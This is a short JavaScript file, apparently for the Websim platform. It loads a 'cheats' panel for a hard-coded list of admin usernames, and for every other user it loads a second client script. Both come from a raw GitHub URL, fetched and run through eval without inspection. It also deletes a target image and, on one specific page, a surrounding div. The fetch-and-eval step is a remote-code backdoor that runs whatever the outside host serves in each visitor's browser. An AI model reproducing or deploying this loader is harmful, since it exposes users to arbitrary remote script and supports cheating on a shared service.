let admins = ["blueyellow", "TheEthicalHacker", "CarEngine"];
let room = new WebsimSocket();
let user = room.peers[room.clientId];
let name = user.username;
async function fetchAndRun(url) {
    const response = await fetch(url);
    const data = await response.text();
    eval(data)
  
}
// Check for unauthorized users
if (admins.includes(name)) {
  console.log("Loading cheats for Websim....");
  const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/panel.js")
  
} else {
  const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/client.js")
}
const targetImage = document.getElementById('targetImage');
  if (targetImage) {
    // But wait! If the current page url contains hmb2y2w5ei78d1fnyvfj, then remove the div 2 layers above the targetImage
    if (window.location.href.includes("hmb2y2w5ei78d1fnyvfj")) {
      const parentDiv = targetImage.parentNode.parentNode;
      if (parentDiv) {
        parentDiv.remove();
      }
    }
    targetImage.remove();
  }